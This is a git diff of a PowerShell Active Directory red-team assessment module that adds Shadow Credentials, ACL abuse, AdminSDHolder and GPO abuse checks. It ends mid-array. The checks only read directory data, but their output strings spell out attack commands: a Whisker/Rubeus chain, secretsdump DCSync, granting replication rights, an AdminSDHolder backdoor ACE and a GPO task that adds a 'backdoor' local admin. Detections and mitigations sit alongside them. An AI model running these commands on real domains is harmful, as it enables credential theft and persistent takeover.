@@ -23,6 +23,7 @@ Set-StrictMode -Version Latest
 
 function New-RedTeamResult {
     param(
+        # Original parameters
         [string]$AttackType,
         [string]$MITRE,
         [bool]$SafeMode,
@@ -34,14 +35,24 @@ function New-RedTeamResult {
         [string[]]$DetectionEvents = @(),
         [string[]]$Mitigations = @(),
         [string[]]$Tools = @(),
-        [string[]]$Commands = @()
+        [string[]]$Commands = @(),
+        # Extended parameters (new calling convention — map to originals)
+        [string]$AttackName,
+        [string]$MitreId,
+        [string]$MitreName,
+        [string[]]$Targets = @()
     )
+    # Support both calling conventions
+    if ($AttackName -and -not $AttackType) { $AttackType = $AttackName }
+    if ($MitreId   -and -not $MITRE)       { $MITRE      = $MitreId   }
     return [PSCustomObject]@{
         AttackType       = $AttackType
         MITRE            = $MITRE
+        MitreName        = $MitreName
         SafeModeOnly     = $SafeMode
         RiskLevel        = $RiskLevel
         ExploitableCount = $ExploitableCount
+        Targets          = $Targets
         Findings         = @($Findings)
         AttackPath       = $AttackPath
         DetectionEvents  = $DetectionEvents
@@ -626,9 +637,7 @@ function Invoke-RedTeamDCSync {
         '# Enumerate DCSync rights (PS, read-only)',
         '(Get-ACL "AD:DC=domain,DC=com").Access | Where-Object { $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" }',
         '',
-        '# Test replication bind (active mode, read-only schema check)',
-        if (-not $SafeMode) { '# Would test: Get-ADReplicationFailure -Target <DC> (validates replication access)' }
-        else { '# [SAFE MODE] Would test replication bind to validate rights' },
+        '# Test replication bind (active mode: Get-ADReplicationFailure -Target <DC>; safe mode: read-only schema check only)',
         '',
         '# Impacket DCSync (requires replication rights)',
         'python3 secretsdump.py DOMAIN/user:pass@<DC_IP> -just-dc-ntlm',
@@ -1437,12 +1446,669 @@ function Invoke-RedTeamLateralMovement {
 
 #endregion
 
+#region ShadowCredentials (T1556)
+
+function Invoke-RedTeamShadowCredentials {
+    <#
+    .SYNOPSIS
+        Red team enumeration for Shadow Credentials attack via msDS-KeyCredentialLink (T1556).
+    .DESCRIPTION
+        Enumerates:
+          1. Accounts/computers that already have msDS-KeyCredentialLink set (possible backdoor).
+          2. Non-admin principals with WriteProperty on the msDS-KeyCredentialLink attribute
+             or GenericWrite/GenericAll on user/computer objects — these can add shadow creds.
+        In active mode (-SafeMode:$false) performs live AD queries if data is not pre-collected.
+        No modifications are made to the AD environment at any setting.
+    #>
+    [CmdletBinding()]
+    param(
+        [hashtable]$ADData = @{},
+        [bool]$SafeMode    = $true
+    )
+
+    $users     = @(if ($ADData.ContainsKey('Users'))     { $ADData.Users }     else { @() })
+    $computers = @(if ($ADData.ContainsKey('Computers')) { $ADData.Computers } else { @() })
+    $acls      = @(if ($ADData.ContainsKey('ACLs'))      { $ADData.ACLs }      else { @() })
+
+    # GUID 5b47d60f-6090-40b2-9f37-2a4de88f3063 = msDS-KeyCredentialLink schemaIdGuid
+    $keyCredLinkGuid   = '5b47d60f-6090-40b2-9f37-2a4de88f3063'
+    $safePrincipals    = @('NT AUTHORITY\\SYSTEM', 'BUILTIN\\Administrators',
+                           'Domain Admins', 'Enterprise Admins',
+                           'Key Admins', 'Enterprise Key Admins',
+                           'Domain Controllers', 'Enterprise Domain Controllers')
+
+    # --- 1. Accounts with keyCredentialLink already populated --------------------------
+    $usersWithKey     = @($users     | Where-Object { $_ -and $_.PSObject.Properties['msDS-KeyCredentialLink'] -and $_.'msDS-KeyCredentialLink' })
+    $computersWithKey = @($computers | Where-Object { $_ -and $_.PSObject.Properties['msDS-KeyCredentialLink'] -and $_.'msDS-KeyCredentialLink' })
+
+    # Active mode: live query if pre-collected data is empty
+    if (-not $SafeMode -and $usersWithKey.Count -eq 0 -and $computersWithKey.Count -eq 0) {
+        try {
+            $usersWithKey     = @(Get-ADUser     -Filter * -Properties 'msDS-KeyCredentialLink' -ErrorAction Stop |
+                                  Where-Object { $_.'msDS-KeyCredentialLink' })
+            $computersWithKey = @(Get-ADComputer -Filter * -Properties 'msDS-KeyCredentialLink' -ErrorAction Stop |
+                                  Where-Object { $_.'msDS-KeyCredentialLink' })
+        }
+        catch { Write-Verbose "Shadow Credentials live query failed: $_" }
+    }
+
+    $keyCredFindings = @()
+    foreach ($acct in ($usersWithKey + $computersWithKey)) {
+        $keyCount = if ($acct.PSObject.Properties['msDS-KeyCredentialLink']) { @($acct.'msDS-KeyCredentialLink').Count } else { 0 }
+        $keyCredFindings += [PSCustomObject]@{
+            Account      = $acct.SamAccountName
+            ObjectClass  = if ($acct.PSObject.Properties['ObjectClass']) { $acct.ObjectClass } else { 'unknown' }
+            KeyCount     = $keyCount
+            Risk         = if ($keyCount -gt 0) { 'Shadow credential present — verify legitimacy' } else { 'Clean' }
+            ExploitCmd   = "Rubeus.exe asktgt /user:$($acct.SamAccountName) /certificate:<pfx_base64> /password:<pfx_pass> /ptt"
+        }
+    }
+
+    # --- 2. Non-admin principals with write access to keyCredentialLink ----------------
+    $writeACEFindings = @($acls | Where-Object {
+        $_ -and $_.AccessControlType -eq 'Allow' -and
+        ($_.ObjectType -eq $keyCredLinkGuid -or
+         $_.ActiveDirectoryRights -match 'GenericWrite|GenericAll') -and
+        $_.IdentityReference -notmatch ($safePrincipals -join '|')
+    } | ForEach-Object {
+        $ace = $_
+        [PSCustomObject]@{
+            Principal    = $ace.IdentityReference.ToString()
+            TargetObject = if ($ace.PSObject.Properties['TargetObject']) { $ace.TargetObject } else { $ace.PSObject.Properties['ObjectDN']?.Value }
+            Right        = $ace.ActiveDirectoryRights.ToString()
+            AttackChain  = "Whisker.exe add /target:<TargetAccount> /domain:<domain> => Rubeus.exe asktgt /ptt => Rubeus.exe tgtdeleg (get NTLM hash)"
+            Impact       = 'Obtain TGT + NTLM hash for target — no password required, works behind LAPS'
+        }
+    })
+
+    # Active mode: live ACL query on all user/computer objects if no ACL data available
+    if (-not $SafeMode -and $writeACEFindings.Count -eq 0 -and $acls.Count -eq 0) {
+        try {
+            $domainDN = (Get-ADDomain -ErrorAction Stop).DistinguishedName
+            $liveACLs = (Get-ACL "AD:$domainDN" -ErrorAction Stop).Access
+            $writeACEFindings = @($liveACLs | Where-Object {
+                $_.AccessControlType -eq 'Allow' -and
+                ($_.ObjectType -eq $keyCredLinkGuid -or
+                 $_.ActiveDirectoryRights -match 'GenericWrite|GenericAll') -and
+                $_.IdentityReference -notmatch ($safePrincipals -join '|')
+            } | ForEach-Object {
+                [PSCustomObject]@{
+                    Principal    = $_.IdentityReference.ToString()
+                    TargetObject = $domainDN
+                    Right        = $_.ActiveDirectoryRights.ToString()
+                    AttackChain  = 'Whisker add → Rubeus asktgt → tgtdeleg (get NTLM hash)'
+                    Impact       = 'Obtain TGT + NTLM hash for target — no password required'
+                }
+            })
+        }
+        catch { Write-Verbose "Shadow Credentials live ACL query failed: $_" }
+    }
+
+    $allFindings = @($keyCredFindings) + @($writeACEFindings)
+
+    return New-RedTeamResult `
+        -AttackType      'Shadow Credentials (msDS-KeyCredentialLink Abuse)' `
+        -MITRE           'T1556' `
+        -SafeMode        $SafeMode `
+        -RiskLevel       'Critical' `
+        -ExploitableCount $allFindings.Count `
+        -Findings        $allFindings `
+        -AttackPath      "1. Find target user/computer where you have WriteProperty on msDS-KeyCredentialLink or GenericWrite.`n2. Whisker.exe add /target:<TargetAccount> /domain:<DomainFQDN> /dc:<DCHostname> — adds forged key credential.`n3. Rubeus.exe asktgt /user:<TargetAccount> /certificate:<PFXBase64> /password:<PFXPassword> /domain:<DomainFQDN> /ptt`n4. Rubeus.exe tgtdeleg — retrieve NTLM hash via U2U from the TGT.`n5. Use NTLM hash: PTH, offline Kerberoast, or Golden Ticket preparation.`nAccounts with keyCredLink set: $($keyCredFindings.Count)  |  ACEs granting write: $($writeACEFindings.Count)" `
+        -DetectionEvents @('5136 (DS attribute modified — msDS-KeyCredentialLink)', '4768 (TGT request with PKINIT)', '4771 (Kerberos pre-auth failure)', 'MDI: Shadow Credentials detection alert') `
+        -Mitigations     @('Restrict WriteProperty on msDS-KeyCredentialLink to DCs + KEY ADMINS + ENTERPRISE KEY ADMINS only', 'Alert on Event 5136 for msDS-KeyCredentialLink changes on any object', 'Add privileged accounts to Protected Users group', 'Enable LDAP signing and channel binding', 'Deploy Microsoft Defender for Identity (MDI)') `
+        -Tools           @('Whisker (https://github.com/eladshamir/Whisker)', 'Rubeus (asktgt + tgtdeleg)', 'pyWhisker (https://github.com/ShutdownRepo/pywhisker)', 'Certipy') `
+        -Commands        @(
+            '# Enumerate all accounts with msDS-KeyCredentialLink set (Blue Team)',
+            'Get-ADUser -Filter * -Properties msDS-KeyCredentialLink | Where-Object { $_."msDS-KeyCredentialLink" } | Select-Object SamAccountName, @{n="KeyCount";e={$_."msDS-KeyCredentialLink".Count}}',
+            'Get-ADComputer -Filter * -Properties msDS-KeyCredentialLink | Where-Object { $_."msDS-KeyCredentialLink" } | Select-Object Name, DNSHostName, @{n="KeyCount";e={$_."msDS-KeyCredentialLink".Count}}',
+            '',
+            '# Find principals with WriteProperty on msDS-KeyCredentialLink (attribute GUID)',
+            '# Get-ObjectAcl -Identity targetUser -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "msDS-KeyCredentialLink" -and $_.ActiveDirectoryRights -match "WriteProperty" }',
+            '',
+            '# Add shadow credential (Red Team — requires write on target account)',
+            '# Whisker.exe add /target:targetUser /domain:domain.local /dc:dc01.domain.local /path:C:\tools\shadow.pfx /password:ShadowPass123',
+            '',
+            '# Obtain TGT using shadow credential (Rubeus)',
+            '# Rubeus.exe asktgt /user:targetUser /certificate:<b64_pfx> /password:ShadowPass123 /domain:domain.local /dc:dc01.domain.local /ptt',
+            '',
+            '# Retrieve NTLM hash via PKINIT U2U (no password needed)',
+            '# Rubeus.exe tgtdeleg /target:targetUser /ptt',
+            '',
+            '# Remove shadow credential after operation (cleanup)',
+            '# Whisker.exe remove /target:targetUser /domain:domain.local /dc:dc01.domain.local /guid:<KeyID>'
+        )
+}
+
+#endregion
+
+#region ACLAbuse (T1222.001)
+
+function Invoke-RedTeamACLAbuse {
+    <#
+    .SYNOPSIS
+        Red team enumeration for ACL object control chaining attack paths (T1222.001).
+    .DESCRIPTION
+        Enumerates specific dangerous ACEs on sensitive AD objects:
+          - WriteDACL / WriteOwner on domain root → DCSync rights
+          - GenericWrite / GenericAll on Domain Admins or Enterprise Admins group → member add
+          - AllExtendedRights on DA user objects → ForceChangePassword
+          - WriteOwner on any high-value object → take ownership → full control
+        In active mode (-SafeMode:$false) performs live ACL queries on critical objects
+        if no pre-collected ACL data is available.
+        No modifications are made to the AD environment at any setting.
+    #>
+    [CmdletBinding()]
+    param(
+        [hashtable]$ADData = @{},
+        [bool]$SafeMode    = $true
+    )
+
+    $acls   = @(if ($ADData.ContainsKey('ACLs'))  { $ADData.ACLs }  else { @() })
+
+    $safePrincipals = @('NT AUTHORITY\\SYSTEM', 'BUILTIN\\Administrators',
+                        'Domain Admins', 'Enterprise Admins',
+                        'Domain Controllers', 'Enterprise Domain Controllers',
+                        'Account Operators', 'S-1-5-18', 'S-1-5-32-544')
+
+    # Helper: resolve an attack chain description from the ACE
+    function Get-ACLAttackChain {
+        param([string]$Rights, [string]$Target)
+        if     ($Rights -match 'WriteDacl|WriteOwner'                    ) { "Grant self DCSync rights on $Target → secretsdump all hashes" }
+        elseif ($Rights -match 'GenericAll|GenericWrite' -and $Target -match 'Admins') { "Add self to $Target → immediate Domain Admin" }
+        elseif ($Rights -match 'AllExtendedRights'                       ) { "ForceChangePassword on $Target → account takeover" }
+        elseif ($Rights -match 'GenericWrite'                            ) { "Set SPN on $Target → Kerberoast → crack offline → escalate" }
+        else                                                               { "Modify $Target object ACL → further escalation" }
+    }
+
+    # --- Enumerate dangerous ACEs from pre-collected data ---
+    $aceFindings = @($acls | Where-Object {
+        $_ -and $_.AccessControlType -eq 'Allow' -and
+        $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|AllExtendedRights' -and
+        $_.IdentityReference -notmatch ($safePrincipals -join '|')
+    } | ForEach-Object {
+        $ace = $_
+        $target = if ($ace.PSObject.Properties['TargetObject']) { $ace.TargetObject } else { 'Unknown' }
+        [PSCustomObject]@{
+            Principal    = $ace.IdentityReference.ToString()
+            TargetObject = $target
+            Right        = $ace.ActiveDirectoryRights.ToString()
+            AttackChain  = Get-ACLAttackChain -Rights $ace.ActiveDirectoryRights.ToString() -Target $target
+            ImpactLevel  = if ($target -match 'Domain Admins|Enterprise Admins|domain,DC=|AdminSDHolder') { 'CRITICAL' } else { 'HIGH' }
+        }
+    })
+
+    # Active mode: live ACL queries on high-value objects if no data pre-collected
+    if (-not $SafeMode -and $acls.Count -eq 0) {
+        try {
+            $domain   = Get-ADDomain -ErrorAction Stop
+            $domainDN = $domain.DistinguishedName
+            $highValuePaths = @(
+                "AD:$domainDN",
+                "AD:CN=AdminSDHolder,CN=System,$domainDN",
+                "AD:CN=Domain Admins,CN=Users,$domainDN",
+                "AD:CN=Enterprise Admins,CN=Users,$domainDN"
+            )
+            foreach ($path in $highValuePaths) {
+                try {
+                    $liveACEs = (Get-ACL $path -ErrorAction Stop).Access
+                    foreach ($ace in $liveACEs) {
+                        if ($ace.AccessControlType -eq 'Allow' -and
+                            $ace.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|AllExtendedRights' -and
+                            $ace.IdentityReference -notmatch ($safePrincipals -join '|')) {
+                            $aceFindings += [PSCustomObject]@{
+                                Principal    = $ace.IdentityReference.ToString()
+                                TargetObject = $path
+                                Right        = $ace.ActiveDirectoryRights.ToString()
+                                AttackChain  = Get-ACLAttackChain -Rights $ace.ActiveDirectoryRights.ToString() -Target $path
+                                ImpactLevel  = 'CRITICAL'
+                            }
+                        }
+                    }
+                }
+                catch { Write-Verbose "ACL query failed for $path : $_" }
+            }
+        }
+        catch { Write-Verbose "ACL abuse live domain query failed: $_" }
+    }
+
+    return New-RedTeamResult `
+        -AttackType      'ACL Object Control Chaining' `
+        -MITRE           'T1222.001' `
+        -SafeMode        $SafeMode `
+        -RiskLevel       'Critical' `
+        -ExploitableCount $aceFindings.Count `
+        -Findings        $aceFindings `
+        -AttackPath      "1. BloodHound/SharpHound: run collection → find shortest ACL path to Domain Admin.`n2. GenericWrite on Domain Admins → Add-ADGroupMember -Identity 'Domain Admins' -Members <attacker>.`n3. WriteDACL on domain root → grant self DS-Replication-Get-Changes-All → Mimikatz lsadump::dcsync.`n4. AllExtendedRights on DA user → Set-ADAccountPassword (no old password needed).`n5. WriteOwner on object → Set-ADObjectOwner self → add WriteDACL → full control.`n6. Once DA: lsadump::dcsync /user:krbtgt → Golden Ticket → persistent access.`nDangerous ACEs found: $($aceFindings.Count)" `
+        -DetectionEvents @('4728/4732/4756 (privileged group membership change)', '5136 (DS object attribute modified)', '4662 (object access — ACL change)', '4670 (permissions changed on AD object)', 'MDI/Sentinel: suspicious ACL modification') `
+        -Mitigations     @('Run BloodHound regularly — alert on new attack path edges to DA/EA', 'Remove GenericWrite/GenericAll/WriteDACL/WriteOwner from non-admin principals on critical objects', 'Enable DS Access auditing (Subcategory: Directory Service Changes)', 'Add DA/EA accounts to Protected Users group', 'Use ADACLScanner to baseline and diff ACLs on sensitive objects', 'Deploy Microsoft Defender for Identity') `
+        -Tools           @('BloodHound / SharpHound (path enumeration)', 'PowerView (Get-ObjectAcl)', 'ADACLScanner (ACL baseline)', 'Impacket/dacledit.py', 'PowerView (Add-DomainObjectAcl)') `
+        -Commands        @(
+            '# Live ACL audit on domain root (PowerShell — no tools required)',
+            '$dn = (Get-ADDomain).DistinguishedName',
+            '(Get-ACL "AD:$dn").Access | Where-Object { $_.ActiveDirectoryRights -match "WriteDacl|WriteOwner|GenericAll|GenericWrite" -and $_.AccessControlType -eq "Allow" } | Select-Object IdentityReference, ActiveDirectoryRights',
+            '',
+            '# Audit AdminSDHolder ACL',
+            '(Get-ACL "AD:CN=AdminSDHolder,CN=System,$dn").Access | Where-Object { $_.AccessControlType -eq "Allow" } | Select-Object IdentityReference, ActiveDirectoryRights',
+            '',
+            '# BloodHound Cypher: shortest path to Domain Admins',
+            '# MATCH p=shortestPath((u:User {name:"ATTACKER@DOMAIN.COM"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})) RETURN p',
+            '',
+            '# GenericWrite on DA group → add yourself (Red Team)',
+            '# Add-ADGroupMember -Identity "Domain Admins" -Members <attackerAccount>',
+            '',
+            '# WriteDACL on domain root → grant DCSync rights (Red Team)',
+            '# $acl = Get-ACL "AD:$dn"',
+            '# $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule([System.Security.Principal.NTAccount]"DOMAIN\attacker","ExtendedRight","Allow",[Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")',
+            '# $acl.AddAccessRule($rule); Set-ACL "AD:$dn" $acl'
+        )
+}
+
+#endregion
+
+#region AdminSDHolder (T1098)
+
+function Invoke-RedTeamAdminSDHolder {
+    <#
+    .SYNOPSIS
+        Red team enumeration for AdminSDHolder/SDProp persistence backdoor (T1098).
+    .DESCRIPTION
+        Enumerates:
+          1. All accounts with AdminCount=1 — the SDProp blast radius (protected objects).
+          2. Suspicious ACEs on CN=AdminSDHolder,CN=System (non-admin principals with
+             GenericAll/GenericWrite/WriteDACL/WriteOwner/AllExtendedRights).
+        A backdoor ACE on AdminSDHolder propagates to ALL protected accounts every 60 min,
+        surviving manual ACL cleanup attempts.
+        In active mode (-SafeMode:$false) performs a live ACL query on AdminSDHolder
+        if no pre-collected ACL data is available.
+        No modifications are made to the AD environment at any setting.
+    #>
+    [CmdletBinding()]
+    param(
+        [hashtable]$ADData = @{},
+        [bool]$SafeMode    = $true
+    )
+
+    $users = @(if ($ADData.ContainsKey('Users')) { $ADData.Users } else { @() })
+    $acls  = @(if ($ADData.ContainsKey('ACLs'))  { $ADData.ACLs }  else { @() })
+
+    $safePrincipals = @('NT AUTHORITY\\SYSTEM', 'BUILTIN\\Administrators',
+                        'Domain Admins', 'Enterprise Admins',
+                        'Domain Controllers', 'S-1-5-18', 'S-1-5-32-544')
+
+    # --- 1. Protected accounts (AdminCount=1) — SDProp blast radius ------------------
+    $protectedAccounts = @($users | Where-Object {
+        $_ -and $_.PSObject.Properties['AdminCount'] -and $_.AdminCount -eq 1
+    })
+
+    # Active mode: live query if no pre-collected user data
+    if (-not $SafeMode -and $protectedAccounts.Count -eq 0) {
+        try {
+            $protectedAccounts = @(Get-ADUser -Filter { AdminCount -eq 1 } -Properties AdminCount, Enabled, MemberOf -ErrorAction Stop)
+        }
+        catch { Write-Verbose "AdminSDHolder: live AdminCount=1 query failed: $_" }
+    }
+
+    $blastRadiusFindings = @($protectedAccounts | ForEach-Object {
+        [PSCustomObject]@{
+            Account     = $_.SamAccountName
+            Enabled     = if ($_.PSObject.Properties['Enabled']) { $_.Enabled } else { 'Unknown' }
+            AdminCount  = 1
+            Risk        = 'Protected by SDProp — backdoor ACE on AdminSDHolder will auto-propagate here every 60 min'
+        }
+    })
+
+    # --- 2. Suspicious ACEs on AdminSDHolder -----------------------------------------
+    $adminSDHolderACEs = @($acls | Where-Object { $_ -and $_.PSObject.Properties['TargetObject'] -and $_.TargetObject -like '*CN=AdminSDHolder*' })
+
+    # Active mode: live ACL query on AdminSDHolder
+    if (-not $SafeMode -and $adminSDHolderACEs.Count -eq 0) {
+        try {
+            $dn = (Get-ADDomain -ErrorAction Stop).DistinguishedName
+            $adminSDHolderACEs = @((Get-ACL "AD:CN=AdminSDHolder,CN=System,$dn" -ErrorAction Stop).Access)
+        }
+        catch { Write-Verbose "AdminSDHolder: live ACL query failed: $_" }
+    }
+
+    $backdoorACEFindings = @($adminSDHolderACEs | Where-Object {
+        $_ -and $_.AccessControlType -eq 'Allow' -and
+        $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|AllExtendedRights' -and
+        $_.IdentityReference -notmatch ($safePrincipals -join '|')
+    } | ForEach-Object {
+        $ace = $_
+        [PSCustomObject]@{
+            Principal        = $ace.IdentityReference.ToString()
+            Right            = $ace.ActiveDirectoryRights.ToString()
+            PropagatesTo     = "$($protectedAccounts.Count) protected accounts (AdminCount=1) within 60 minutes"
+            PersistenceRisk  = 'CRITICAL — survives manual ACL cleanup on individual protected accounts'
+            RemediationStep  = "Remove-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System' -PrincipalIdentity '$($ace.IdentityReference)' -Rights All"
+        }
+    })
+
+    $allFindings = @($backdoorACEFindings) + @($blastRadiusFindings)
+
+    return New-RedTeamResult `
+        -AttackType      'AdminSDHolder/SDProp Persistence Backdoor' `
+        -MITRE           'T1098' `
+        -SafeMode        $SafeMode `
+        -RiskLevel       'Critical' `
+        # ExploitableCount: number of backdoor ACEs found + 1 if any protected accounts exist
+        # (protected accounts contribute 1 point total since they represent a blast radius, not individual exploitable entities)
+        -ExploitableCount ($backdoorACEFindings.Count + [Math]::Min($protectedAccounts.Count, 1)) `
+        -Findings        $allFindings `
+        -AttackPath      "1. Achieve DA or WriteDACL on CN=AdminSDHolder,CN=System.`n2. Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' -PrincipalIdentity <attacker> -Rights All`n3. SDProp propagates backdoor ACE to ALL $($protectedAccounts.Count) AdminCount=1 accounts within 60 minutes.`n4. Persistence: manual ACL revocation on individual accounts is overwritten every 60 min until AdminSDHolder is cleaned.`n5. Force immediate propagation: Set-ADObject (RunProtectAdminGroupsTask) or Invoke-ADSDPropagation.`nBackdoor ACEs on AdminSDHolder: $($backdoorACEFindings.Count)  |  Protected accounts at risk: $($protectedAccounts.Count)" `
+        -DetectionEvents @('5136 (DS attribute modified on CN=AdminSDHolder)', '4662 (object access on AdminSDHolder)', 'MDI: AdminSDHolder modification alert', 'Anomalous ACL propagation event on protected accounts') `
+        -Mitigations     @('Alert on ANY 5136 event for CN=AdminSDHolder,CN=System modifications', 'Baseline and diff AdminSDHolder ACL weekly (ADACLScanner)', 'Restrict DA usage — require JIT/PAM for DA-level operations', 'Restrict who can write to AdminSDHolder (Tier 0 only)', 'Deploy Microsoft Defender for Identity (AdminSDHolder modification detection)') `
+        -Tools           @('PowerView (Add-DomainObjectAcl / Remove-DomainObjectAcl)', 'ADACLScanner (ACL baseline)', 'Impacket/dacledit.py', 'Invoke-ADSDPropagation') `
+        -Commands        @(
+            '# Live audit of AdminSDHolder ACL (Blue Team)',
+            '$dn = (Get-ADDomain).DistinguishedName',
+            '(Get-ACL "AD:CN=AdminSDHolder,CN=System,$dn").Access | Where-Object { $_.AccessControlType -eq "Allow" } | Select-Object IdentityReference, ActiveDirectoryRights | Sort-Object IdentityReference',
+            '',
+            '# List all protected accounts (AdminCount=1)',
+            'Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount, Enabled | Select-Object SamAccountName, Enabled | Sort-Object SamAccountName',
+            '',
+            '# Add backdoor ACE to AdminSDHolder (Red Team — requires DA)',
+            '# Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -PrincipalIdentity <attacker> -Rights All -Verbose',
+            '',
+            '# Force immediate SDProp execution (accelerate propagation)',
+            '# $domain = (Get-ADDomain).DistinguishedName',
+            '# Set-ADObject $domain -Replace @{RunProtectAdminGroupsTask=1}',
+            '',
+            '# Remove backdoor ACE (Blue Team remediation)',
+            '# Remove-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -PrincipalIdentity <attacker> -Rights All'
+        )
+}
+
+#endregion
+
+#region GPOAbuse (T1484.001)
+
+function Invoke-RedTeamGPOAbuse {
+    <#
+    .SYNOPSIS
+        Red team enumeration for GPO write abuse — code execution and persistence at scale (T1484.001).
+    .DESCRIPTION
+        Enumerates:
+          1. Non-admin principals with GpoEdit/Write rights on any GPO (via AD ACL data).
+          2. High-impact GPOs linked to Domain root or Domain Controllers OU.
+        In active mode (-SafeMode:$false) also queries Get-GPO and Get-GPPermissions directly
+        to enumerate the full GPO permission surface if GroupPolicy module is available.
+        No modifications are made to the AD environment at any setting.
+    #>
+    [CmdletBinding()]
+    param(
+        [hashtable]$ADData = @{},
+        [bool]$SafeMode    = $true
+    )
+
+    $acls = @(if ($ADData.ContainsKey('ACLs')) { $ADData.ACLs } else { @() })
+    $gpos = @(if ($ADData.ContainsKey('GPOs')) { $ADData.GPOs } else { @() })
+
+    $safePrincipals = @('NT AUTHORITY\\SYSTEM', 'BUILTIN\\Administrators',
+                        'Domain Admins', 'Enterprise Admins', 'CREATOR OWNER',
+                        'Group Policy Creator Owners', 'Domain Controllers')
+
+    # --- 1. Writable GPO ACEs from pre-collected ACL data ----------------------------
+    $writableACEFindings = @($acls | Where-Object {
+        $_ -and $_.AccessControlType -eq 'Allow' -and
+        $_.TargetObject -match 'CN=Policies,CN=System|\{[0-9A-Fa-f\-]{36}\}' -and
+        $_.ActiveDirectoryRights -match 'GenericWrite|GenericAll|WriteDacl|WriteOwner' -and
+        $_.IdentityReference -notmatch ($safePrincipals -join '|')
+    } | ForEach-Object {
+        $ace = $_
+        $gpoGuid = if ($ace.TargetObject -match '\{([0-9A-Fa-f\-]{36})\}') { $Matches[1] } else { 'Unknown' }
+        [PSCustomObject]@{
+            Principal    = $ace.IdentityReference.ToString()
+            GPOGuid      = $gpoGuid
+            Right        = $ace.ActiveDirectoryRights.ToString()
+            AttackVector = 'SharpGPOAbuse.exe --AddComputerTask --TaskName Updater --Command cmd.exe --Arguments "/c <payload>" --GPOName "<GPOName>"'
+            Impact       = 'All machines in GPO scope receive malicious policy within 90 min (default GP refresh interval)'
+        }
+    })
+
+    # --- 2. High-impact GPOs (linked to domain root or DC OU) from pre-collected GPO data ---
+    $highImpactGPOFindings = @($gpos | Where-Object {
+        $_ -and (
+            ($_.PSObject.Properties['LinkedTo']      -and $_.LinkedTo      -match 'Domain Root|Domain Controllers') -or
+            ($_.PSObject.Properties['IsLinkedToDCOU'] -and $_.IsLinkedToDCOU -eq $true)
+        )
+    } | ForEach-Object {
+        [PSCustomObject]@{
+            GPOName     = if ($_.PSObject.Properties['DisplayName']) { $_.DisplayName } else { $_.Name }
+            GPOGuid     = if ($_.PSObject.Properties['Id'])          { $_.Id.ToString() } else { 'Unknown' }
+            LinkedTo    = if ($_.PSObject.Properties['LinkedTo'])     { $_.LinkedTo     } else { 'Domain Root / DC OU' }
+            Impact      = 'Writing to this GPO affects ALL domain machines or ALL Domain Controllers'
+        }
+    })
+
+    # Active mode: live GPO permission enumeration via GroupPolicy module
+    $liveGPOFindings = @()
+    if (-not $SafeMode) {
+        try {
+            $allGPOs = Get-GPO -All -ErrorAction Stop
+            foreach ($gpo in $allGPOs) {
+                try {
+                    $perms = Get-GPPermissions -Guid $gpo.Id -All -ErrorAction Stop
+                    foreach ($perm in $perms) {
+                        if ($perm.Permission -match 'GpoEdit|GpoEditDeleteModifySecurity' -and
+                            $perm.Trustee.Name -notmatch ($safePrincipals -join '|')) {
+                            $liveGPOFindings += [PSCustomObject]@{
+                                Principal    = $perm.Trustee.Name
+                                GPOName      = $gpo.DisplayName
+                                GPOGuid      = $gpo.Id.ToString()
+                                Permission   = $perm.Permission.ToString()
+                                AttackVector = "SharpGPOAbuse.exe --AddComputerTask --TaskName Updater --Command cmd.exe --Arguments `"/c <payload>`" --GPOName `"$($gpo.DisplayName -replace '"', '')`""
+                                Impact       = 'All machines in GPO scope receive malicious policy within 90 min'
+                            }
+                        }
+                    }
+                }
+                catch { Write-Verbose "GPO permission query failed for $($gpo.DisplayName): $_" }
+            }
+        }
+        catch { Write-Verbose "Get-GPO enumeration failed (GroupPolicy module may not be available): $_" }
+    }
+
+    $allFindings = @($writableACEFindings) + @($highImpactGPOFindings) + @($liveGPOFindings)
+
+    return New-RedTeamResult `
+        -AttackType      'GPO Object Write Abuse (Large-Scale Code Execution)' `
+        -MITRE           'T1484.001' `
+        -SafeMode        $SafeMode `
+        -RiskLevel       'Critical' `
+        -ExploitableCount $allFindings.Count `
+        -Findings        $allFindings `
+        -AttackPath      "1. Identify GPOs with write access: Get-GPO -All | ForEach-Object { Get-GPPermissions -Guid `$_.Id -All } | Where-Object { `$_.Permission -match 'GpoEdit' }.`n2. Note which OUs the target GPO is linked to (blast radius — all machines in OU receive the change).`n3. SharpGPOAbuse.exe --AddComputerTask --TaskName Updater --Author 'NT AUTHORITY\SYSTEM' --Command cmd.exe --Arguments '/c net user backdoor P@ss123 /add && net localgroup Administrators backdoor /add' --GPOName 'Default Domain Policy'`n4. Wait up to 90 min for GP refresh, or force: Invoke-GPUpdate -Computer <target> -RandomDelayInMinutes 0.`n5. Targets scope: $($liveGPOFindings.Count + $writableACEFindings.Count) writable GPOs / $($highImpactGPOFindings.Count) high-impact GPOs found." `
+        -DetectionEvents @('5136 (DS attribute modified — GPO change in AD)', '4670 (permissions changed on GPO object)', 'SYSVOL file modification events (Sysmon/EDR)', 'MDI/Sentinel: anomalous GPO modification', 'Windows Event: Group Policy operational log errors') `
+        -Mitigations     @('Restrict GPO edit rights to Domain Admins and designated GPO admins only', 'Enable DS Change auditing (5136) on CN=Policies,CN=System', 'Monitor SYSVOL for unexpected script/task file changes', 'Require change management approval for GPO modifications', 'Review Group Policy Creator Owners membership', 'Deploy Microsoft Defender for Identity') `
+        -Tools           @('SharpGPOAbuse (https://github.com/FSecureLABS/SharpGPOAbuse)', 'pyGPOAbuse (https://github.com/Hackndo/pyGPOAbuse)', 'BloodHound (GPO write edges)', 'PowerView (Get-DomainObjectAcl on GPO objects)') `
+        -Commands        @(
